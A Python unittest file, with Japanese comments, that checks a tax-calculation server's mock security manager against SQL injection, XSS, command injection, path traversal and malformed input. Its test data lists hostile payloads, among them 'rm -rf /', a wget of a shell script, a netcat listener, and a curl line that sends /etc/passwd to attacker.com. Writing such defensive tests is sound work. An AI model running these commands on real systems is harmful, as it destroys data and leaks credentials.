"""入力検証セキュリティテスト

TaxMCPサーバーの入力検証機能をテストする
"""

import unittest
import sys
import json
from pathlib import Path
from unittest.mock import Mock, patch

# プロジェクトルートをパスに追加
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from tests.utils.test_config import TaxMCPTestCase, SecurityTestMixin
from tests.utils.assertion_helpers import SecurityAssertions
from tests.utils.mock_security_manager import MockSecurityManager


class TestInputValidation(TaxMCPTestCase, SecurityTestMixin):
    """入力検証セキュリティテストクラス"""
    
    def setUp(self):
        """テストセットアップ"""
        super().setUp()
        self.setup_mocks()
        self.security_manager = MockSecurityManager()
    
    def test_sql_injection_prevention(self):
        """SQLインジェクション防止テスト"""
        print("\n=== SQLインジェクション防止テスト ===")
        
        # SQLインジェクション攻撃パターン
        sql_injection_patterns = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM sensitive_data --",
            "'; UPDATE users SET password='hacked' WHERE id=1; --",
            "' OR 1=1 /*",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        for pattern in sql_injection_patterns:
            print(f"\n--- SQLインジェクションパターン: {pattern[:30]}... ---")
            
            # 悪意のある入力を含むリクエスト
            malicious_request = {
                "method": "calculate_income_tax",
                "params": {
                    "income": pattern,
                    "tax_year": 2025,
                    "user_name": f"test_user{pattern}",
                    "notes": f"Tax calculation for {pattern}"
                }
            }
            
            print(f"悪意のあるリクエスト: {malicious_request}")
            
            # 入力検証実行
            validation_result = self.security_manager.validate_input(
                malicious_request["params"]
            )
            
            print(f"検証結果: {validation_result}")
            
            # SQLインジェクション検出のアサーション
            SecurityAssertions.assert_sql_injection_blocked(self.security_manager, pattern)
            self.assertFalse(
                validation_result["valid"],
                "SQLインジェクションが検出・ブロックされている"
            )
            self.assertIn(
                "sql_injection",
                validation_result["threats_detected"],
                "SQLインジェクション脅威が検出されている"
            )
            
            print(f"✓ SQLインジェクションパターン '{pattern[:20]}...' ブロック成功")
    
    def test_xss_prevention(self):
        """XSS攻撃防止テスト"""
        print("\n=== XSS攻撃防止テスト ===")
        
        # XSS攻撃パターン
        xss_patterns = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input type='text' value='' onfocus='alert(\"XSS\")'>",
            "<a href='javascript:alert(\"XSS\")'>Click me</a>"
        ]
        
        for pattern in xss_patterns:
            print(f"\n--- XSSパターン: {pattern[:30]}... ---")
            
            # 悪意のある入力を含むリクエスト
            malicious_request = {
                "method": "search_tax_info",
                "params": {
                    "query": pattern,
                    "category": f"tax_law{pattern}",
                    "description": f"Search for {pattern}",
                    "user_comment": pattern
                }
            }
            
            print(f"悪意のあるリクエスト: {malicious_request}")
            
            # 入力検証実行
            validation_result = self.security_manager.validate_input(
                malicious_request["params"]
            )
            
            print(f"検証結果: {validation_result}")
            
            # XSS検出のアサーション
            SecurityAssertions.assert_xss_blocked(self.security_manager, pattern)
            self.assertFalse(
                validation_result["valid"],
                "XSS攻撃が検出・ブロックされている"
            )
            self.assertIn(
                "xss",
                validation_result["threats_detected"],
                "XSS脅威が検出されている"
            )
            
            print(f"✓ XSSパターン '{pattern[:20]}...' ブロック成功")
    
    def test_command_injection_prevention(self):
        """コマンドインジェクション防止テスト"""
        print("\n=== コマンドインジェクション防止テスト ===")
        
        # コマンドインジェクション攻撃パターン
        command_injection_patterns = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; wget http://malicious.com/shell.sh",
            "| nc -l 4444",
            "; curl http://attacker.com/steal?data=$(cat /etc/passwd)",
            "&& echo 'hacked' > /tmp/hacked.txt",
            "; python -c 'import os; os.system(\"rm -rf /\")'"
        ]
        
        for pattern in command_injection_patterns:
            print(f"\n--- コマンドインジェクションパターン: {pattern[:30]}... ---")
            
            # 悪意のある入力を含むリクエスト
            malicious_request = {
                "method": "export_tax_data",
                "params": {
                    "filename": f"tax_report{pattern}",
                    "format": f"csv{pattern}",
                    "output_path": f"/tmp/export{pattern}",
                    "command": pattern
                }
            }
            
            print(f"悪意のあるリクエスト: {malicious_request}")
            
            # 入力検証実行
            validation_result = self.security_manager.validate_input(
                malicious_request["params"]
            )
            
            print(f"検証結果: {validation_result}")
            
            # コマンドインジェクション検出のアサーション
            SecurityAssertions.assert_command_injection_blocked(self.security_manager, pattern)
            self.assertFalse(
                validation_result["valid"],
                "コマンドインジェクションが検出・ブロックされている"
            )
            self.assertIn(
                "command_injection",
                validation_result["threats_detected"],
                "コマンドインジェクション脅威が検出されている"
            )
            
            print(f"✓ コマンドインジェクションパターン '{pattern[:20]}...' ブロック成功")
    
    def test_path_traversal_prevention(self):
        """パストラバーサル攻撃防止テスト"""
        print("\n=== パストラバーサル攻撃防止テスト ===")
        
        # パストラバーサル攻撃パターン
        path_traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "../../../../../proc/self/environ",
            "..\\..\\..\\..\\boot.ini"
        ]
        
        for pattern in path_traversal_patterns:
            print(f"\n--- パストラバーサルパターン: {pattern[:30]}... ---")
            
            # 悪意のある入力を含むリクエスト
            malicious_request = {
                "method": "load_tax_template",
                "params": {
                    "template_path": pattern,
                    "config_file": f"config/{pattern}",
                    "data_file": f"data/{pattern}.json",
                    "log_file": f"logs/{pattern}.log"
                }
            }
            
            print(f"悪意のあるリクエスト: {malicious_request}")
            
            # 入力検証実行
            validation_result = self.security_manager.validate_input(
                malicious_request["params"]
            )
            
            print(f"検証結果: {validation_result}")
            
            # パストラバーサル検出のアサーション
            SecurityAssertions.assert_path_traversal_blocked(self.security_manager, pattern)
            self.assertFalse(
                validation_result["valid"],
                "パストラバーサル攻撃が検出・ブロックされている"
            )
            self.assertIn(
                "path_traversal",
                validation_result["threats_detected"],
                "パストラバーサル脅威が検出されている"
            )
            
            print(f"✓ パストラバーサルパターン '{pattern[:20]}...' ブロック成功")
    
    def test_data_type_validation(self):
        """データ型検証テスト"""
        print("\n=== データ型検証テスト ===")
        
        # 無効なデータ型のテストケース
        invalid_data_types = [
            {
                "field": "income",
                "value": "not_a_number",
                "expected_type": "float",
                "description": "所得に文字列"
            },
            {
                "field": "tax_year",
                "value": "2025abc",
                "expected_type": "int",
                "description": "税年度に無効な文字列"
            },
            {
                "field": "deductions",
                "value": "invalid_array",
                "expected_type": "float",
                "description": "控除に配列以外"
            },
            {
                "field": "married",
                "value": "maybe",
                "expected_type": "boolean",
                "description": "婚姻状況に無効な値"
            },
            {
                "field": "birth_date",
                "value": "invalid_date",
                "expected_type": "date",
                "description": "生年月日に無効な日付"
            }
        ]
        
        for test_case in invalid_data_types:
            print(f"\n--- {test_case['description']} ---")
            
            # 無効なデータ型を含むリクエスト
            invalid_request = {
                "method": "calculate_income_tax",
                "params": {
                    test_case["field"]: test_case["value"]
                }
            }
            
            print(f"無効なリクエスト: {invalid_request}")
            
            # データ型検証実行
            validation_result = self.security_manager.validate_data_types(
                invalid_request["params"]
            )
            
            print(f"検証結果: {validation_result}")
            
            # データ型検証のアサーション
            SecurityAssertions.assert_data_type_invalid(
                self.security_manager, 
                test_case["field"],
                test_case["value"],
                test_case["expected_type"]
            )
            self.assertFalse(
                validation_result["valid"],
                f"{test_case['field']}のデータ型が無効として検出されている"
            )
            self.assertIn(
                test_case["field"],
                validation_result["invalid_fields"],
                f"{test_case['field']}が無効フィールドとして記録されている"
            )
            
            print(f"✓ {test_case['description']}検証成功")
    
    def test_input_length_validation(self):
        """入力長制限テスト"""
        print("\n=== 入力長制限テスト ===")
        
        # 長すぎる入力のテストケース
        length_test_cases = [
            {
                "field": "user_name",
                "value": "a" * 1001,  # 1000文字制限を超過
                "max_length": 1000,
                "description": "ユーザー名が長すぎる"
            },
            {
                "field": "description",
                "value": "b" * 5001,  # 5000文字制限を超過
                "max_length": 5000,
                "description": "説明文が長すぎる"
            },
            {
                "field": "api_key",
                "value": "c" * 257,   # 256文字制限を超過
                "max_length": 256,
                "description": "APIキーが長すぎる"
            },
            {
                "field": "query",
                "value": "d" * 2001,  # 2000文字制限を超過
                "max_length": 2000,
                "description": "検索クエリが長すぎる"
            }
        ]
        
        for test_case in length_test_cases:
            print(f"\n--- {test_case['description']} ---")
            print(f"入力長: {len(test_case['value'])}文字 (制限: {test_case['max_length']}文字)")
            
            # 長すぎる入力を含むリクエスト
            invalid_request = {
                "method": "process_data",
                "params": {
                    test_case["field"]: test_case["value"]
                }
            }

            print(f"無効なリクエスト: {invalid_request}")

            # 入力長検証実行
            validation_result = self.security_manager.validate_input_length(
                invalid_request["params"]
            )

            print(f"検証結果: {validation_result}")

            # 入力長検証のアサーション
            SecurityAssertions.assert_input_length_exceeded(
                self.security_manager,
                test_case["field"],
                test_case["value"],
                test_case["max_length"]
            )
            self.assertFalse(
                validation_result["valid"],
                f"{test_case['field']}の入力長が制限を超過していると検出されている"
            )
            self.assertIn(
                test_case["field"],
                validation_result["length_violations"],
                f"{test_case['field']}が長さ違反として記録されている"
            )


    
    def test_special_character_validation(self):
        """特殊文字検証テスト"""
        print("\n=== 特殊文字検証テスト ===")
        
        # 危険な特殊文字のテストケース
        special_char_cases = [
            {
                "input": "test\x00null_byte",
                "description": "ヌルバイト攻撃",
                "threat_type": "null_byte_injection"
            },
            {
                "input": "test\r\nHTTP/1.1 200 OK\r\n\r\n<html>Injected</html>",
                "description": "HTTPレスポンス分割攻撃",
                "threat_type": "http_response_splitting"
            },
            {
                "input": "test\x1f\x7f\x80\xff",
                "description": "制御文字攻撃",
                "threat_type": "control_character_injection"
            },
            {
                "input": "test\u202e\u202d\u200e\u200f",
                "description": "Unicode制御文字攻撃",
                "threat_type": "unicode_control_injection"
            },
            {
                "input": "test\\x41\\x42\\x43",
                "description": "エスケープシーケンス攻撃",
                "threat_type": "escape_sequence_injection"
            }
        ]
        
        for test_case in special_char_cases:
            print(f"\n--- {test_case['description']} ---")
            
            # 特殊文字を含むリクエスト
            special_char_request = {
                "method": "process_text_input",
                "params": {
                    "text_input": test_case["input"],
                    "user_comment": f"Comment with {test_case['input']}",
                    "search_query": test_case["input"]
                }
            }
            
            print(f"特殊文字リクエスト: {repr(test_case['input'][:50])}...")
            
            # 特殊文字検証実行
            validation_result = self.security_manager.validate_special_characters(
                special_char_request["params"]
            )
            
            print(f"検証結果: {validation_result}")
            
            # 特殊文字検証のアサーション
            SecurityAssertions.assert_special_characters_blocked(self.security_manager, test_case["input"])
            self.assertFalse(
                validation_result["valid"],
                f"{test_case['description']}が検出・ブロックされている"
            )
            self.assertIn(
                test_case["threat_type"],
                validation_result["threats_detected"],
                f"{test_case['threat_type']}脅威が検出されている"
            )
            
            print(f"✓ {test_case['description']}検証成功")
    
    def test_json_structure_validation(self):
        """JSON構造検証テスト"""
        print("\n=== JSON構造検証テスト ===")
        
        # 無効なJSON構造のテストケース
        invalid_json_cases = [
            {
                "json_data": '{"income": 5000000, "tax_year": 2025,}',  # 末尾カンマ
                "description": "末尾カンマエラー"
            },
            {
                "json_data": '{"income": 5000000 "tax_year": 2025}',  # カンマ不足
                "description": "カンマ不足エラー"
            },
            {
                "json_data": '{"income": 5000000, "tax_year": }',  # 値不足
                "description": "値不足エラー"
            },
            {
                "json_data": '{"income": 5000000, "tax_year": 2025',  # 閉じ括弧不足
                "description": "閉じ括弧不足エラー"
            },
            {
                "json_data": 'income: 5000000, tax_year: 2025}',  # 開き括弧不足
                "description": "開き括弧不足エラー"
            }
        ]
        
        for test_case in invalid_json_cases:
            print(f"\n--- {test_case['description']} ---")
            
            print(f"無効なJSON: {test_case['json_data']}")
            
            # JSON構造検証実行
            validation_result = self.security_manager.validate_json_structure(
                test_case["json_data"]
            )

            print(f"検証結果: {validation_result}")

            # JSON構造検証のアサーション
            SecurityAssertions.assert_json_invalid(
                self.security_manager,
                json_data=test_case["json_data"],
                description=test_case["description"]
            )
            self.assertFalse(
                validation_result["valid"],
                f"{test_case['description']}が検出されている"
            )
            self.assertEqual(
                "syntax_error",
                validation_result["error_type"],
                "JSON構文エラーが検出されている"
            )
            
            print(f"✓ {test_case['description']}検証成功")
    
    def test_business_logic_validation(self):
        """ビジネスロジック検証テスト"""
        print("\n=== ビジネスロジック検証テスト ===")
        
        # ビジネスロジック違反のテストケース
        business_logic_violations = [
            {
                "params": {
                    "income": -1000000,  # 負の所得
                    "tax_year": 2025
                },
                "violation_type": "negative_income",
                "description": "負の所得"
            },
            {
                "params": {
                    "income": 5000000,
                    "tax_year": 1900  # 古すぎる税年度
                },
                "violation_type": "invalid_tax_year",
                "description": "無効な税年度"
            },
            {
                "params": {
                    "income": 5000000,
                    "deductions": 6000000,  # 控除が所得を超過
                    "tax_year": 2025
                },
                "violation_type": "deductions_exceed_income",
                "description": "控除額が所得を超過"
            },
            {
                "params": {
                    "birth_date": "2030-01-01",  # 未来の生年月日
                    "tax_year": 2025
                },
                "violation_type": "future_birth_date",
                "description": "未来の生年月日"
            },
            {
                "params": {
                    "income": 999999999999999,  # 非現実的な高額所得
                    "tax_year": 2025
                },
                "violation_type": "unrealistic_income",
                "description": "非現実的な高額所得"
            }
        ]
        
        for test_case in business_logic_violations:
            print(f"\n--- {test_case['description']} ---")
            
            # ビジネスロジック違反リクエスト
            violation_request = {
                "method": "calculate_income_tax",
                "params": test_case["params"]
            }
            
            print(f"違反リクエスト: {violation_request}")
            
            # ビジネスロジック検証実行
            validation_result = self.security_manager.validate_business_logic(
                violation_request["params"]
            )
            
            print(f"検証結果: {validation_result}")
            
            # ビジネスロジック検証のアサーション
            SecurityAssertions.assert_business_logic_violation(self.security_manager, test_case["params"])
            self.assertFalse(
                validation_result["valid"],
                f"{test_case['description']}が検出されている"
            )
            self.assertIn(
                test_case["violation_type"],
                validation_result["violations"],
                f"{test_case['violation_type']}違反が検出されている"
            )
            
            print(f"✓ {test_case['description']}検証成功")
    
    def test_comprehensive_input_validation(self):
        """総合的な入力検証テスト"""
        print("\n=== 総合的な入力検証テスト ===")
        
        # 複数の脅威を含む悪意のあるリクエスト
        malicious_comprehensive_request = {
            "method": "calculate_tax_with_notes",
            "params": {
                "income": "'; DROP TABLE users; --",  # SQLインジェクション
                "user_name": "<script>alert('XSS')</script>",  # XSS
                "file_path": "../../../etc/passwd",  # パストラバーサル
                "command": "; rm -rf /",  # コマンドインジェクション
                "notes": "a" * 10001,  # 長すぎる入力
                "special_data": "test\x00null\r\nHTTP/1.1",  # 特殊文字
                "tax_year": -2025,  # ビジネスロジック違反
                "deductions": "not_a_number"  # データ型違反
            }
        }
        
        print(f"悪意のある総合リクエスト: {malicious_comprehensive_request}")
        
        # 総合的な入力検証実行
        comprehensive_validation = self.security_manager.comprehensive_input_validation(
            malicious_comprehensive_request["params"]
        )
        
        print(f"総合検証結果: {comprehensive_validation}")
        
        # 総合検証のアサーション
        SecurityAssertions.assert_comprehensive_validation_failed(self.security_manager, malicious_comprehensive_request["params"])
        self.assertFalse(
            comprehensive_validation["valid"],
            "総合的な入力検証で脅威が検出されている"
        )
        
        # 各脅威タイプの検出確認
        expected_threats = [
            "sql_injection",
            "xss",
            "path_traversal",
            "command_injection",
            "input_length_violation",
            "special_character_injection",
            "business_logic_violation",
            "data_type_violation"
        ]

        detected_threats = comprehensive_validation["threats_detected"]
        for threat in expected_threats:
            self.assertIn(
                threat,
                detected_threats,
                f"{threat}脅威が検出されている"
            )
            print(f"✓ {threat}脅威検出成功")
        
        # セキュリティスコア確認
        security_score = comprehensive_validation["security_score"]
        self.assertLessEqual(
            security_score,
            20,
            "セキュリティスコアが低い（危険）"
        )
        
        print(f"セキュリティスコア: {security_score}/100 (低いほど危険)")
        print("✓ 総合的な入力検証テスト成功")


if __name__ == "__main__":
    unittest.main(verbosity=2)